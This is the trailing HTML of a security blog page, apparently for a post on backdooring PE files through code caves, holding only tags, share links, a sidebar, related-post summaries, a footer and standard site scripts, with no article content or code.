>assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Backdooring+PE+Files+through+Code+Caves+%2B+User+Interaction+%2B+Encoding+%28VOL%3AII%29+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FBackdooring-PE-II%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Backdooring+PE+Files+through+Code+Caves+%2B+User+Interaction+%2B+Encoding+%28VOL%3AII%29+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FBackdooring-PE-II%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FBackdooring-PE-II%2F&text=Backdooring+PE+Files+through+Code+Caves+%2B+User+Interaction+%2B+Encoding+%28VOL%3AII%29+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SLAE64-Egghunter/"><div class="card-body"> <em class="small" data-ts="1611467040" data-df="ll" > Jan 24, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 3 - Egghunter</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a clo...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Encoder/"><div class="card-body"> <em class="small" data-ts="1611553440" data-df="ll" > Jan 25, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 4 - Custom Insertion Encoder</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look ...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Analyzing-Shellcode/"><div class="card-body"> <em class="small" data-ts="1611639840" data-df="ll" > Jan 26, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</h3><div class="text-muted small"><p> These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. The fifth assignment from the seven requires ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Backdooring-PE/" class="btn btn-outline-primary" prompt="Older"><p>Backdooring PE Files through Code Caves</p></a> <a href="/posts/Backdooring-PE-III/" class="btn btn-outline-primary" prompt="Newer"><p>Beating ASLR & NX/DEP without PE Headers/Code Caves (VOL:III)</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
